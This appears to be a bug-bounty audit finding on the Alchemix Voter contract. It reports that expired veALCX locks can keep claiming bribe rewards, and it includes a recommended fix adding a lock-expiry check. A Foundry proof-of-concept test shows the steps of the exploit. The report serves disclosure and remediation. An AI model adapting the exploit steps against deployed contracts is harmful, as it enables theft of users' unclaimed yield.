---
# Core Classification
protocol: Alchemix
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 38155
audit_firm: Immunefi
contest_link: https://immunefi.com/bounty/alchemix-boost/
source_link: none
github_link: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31082%20-%20%5bSC%20-%20Critical%5d%20Expired%20locks%20can%20be%20used%20to%20claim%20rewards.md

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - liquid_staking
  - dexes
  - yield
  - cross_chain
  - rwa

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - infosec_us_team
---

## Vulnerability Title

Expired locks can be used to claim rewards

### Overview


This report is about a bug found in a smart contract on GitHub. The bug allows someone to steal rewards that have not been claimed. The fix for this bug involves checking the expiration date of the lock before claiming rewards. If the lock has expired, the rewards cannot be claimed. This bug can lead to financial problems if not fixed. A proof of concept has been provided to demonstrate how the bug can be exploited.

### Original Finding Content

Report type: Smart Contract


Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol

Impacts:
- Theft of unclaimed yield

## Description
This report is so short because the bug is straightforward to explain and prove.

## Vulnerability Details

Expired locks can keep claiming rewards for any bribe.

## Recommended Fix
The fix requires checking that **block.timestamp** is larger than the lock's expiration date when claiming bribes using the `claimBribes(...)` function in the `Voter` smart contract.

The permanently fixed function is:
```
function claimBribes(address[] memory _bribes, address[][] memory _tokens, uint256 _tokenId) external {
    require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId));

    require(IVotingEscrow(veALCX).lockEnd(_tokenId) > block.timestamp, "token expired");

    for (uint256 i = 0; i < _bribes.length; i++) {
        IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]);
    }
}
```

## Impact

Stealing bribe rewards using expired tokens can lead to solvency issues.


## Proof of Concept

This proof of concept can be added to `src/test/Voting.t.sol`. It demonstrates how a user can create a lock for a min. of 1 epoch, and keep claiming rewards forever (even after expired).

```
    function testClaimingBribesWithExpiredLock() public {

        // User 1
        uint256 tokenId1 = createVeAlcx(holder, TOKEN_1, nextEpoch, false);
        
        address bribeAddress = voter.bribes(address(sushiGauge));
        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10000;
        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        // Step 1- Holder votes
        hevm.prank(holder);
        voter.vote(tokenId1, pools, weights, 0);

        console2.log("------------------------------------------------------------------------");
        console2.log("bal balance of holder before voting", IERC20(bal).balanceOf(holder));

        // Step 2- Start second epoch
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        bool expired =  veALCX.lockEnd(tokenId1) < block.timestamp;
        assertEq(expired, true, "token should be expired");

        // Step 3- Holder claims
        hevm.prank(holder);
        voter.claimBribes(bribes, tokens, tokenId1);
        
        // Step 4- Start third epoch
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        // Step 5- Holder claims
        hevm.prank(holder);
        voter.claimBribes(bribes, tokens, tokenId1);

        console2.log("------------------------------------------------------------------------");
        console2.log("bal balance of holder after voting", IERC20(bal).balanceOf(holder));
        
    }
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Immunefi |
| Protocol | Alchemix |
| Report Date | N/A |
| Finders | infosec_us_team |

### Source Links

- **Source**: N/A
- **GitHub**: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31082%20-%20%5bSC%20-%20Critical%5d%20Expired%20locks%20can%20be%20used%20to%20claim%20rewards.md
- **Contest**: https://immunefi.com/bounty/alchemix-boost/

### Keywords for Search

`vulnerability`

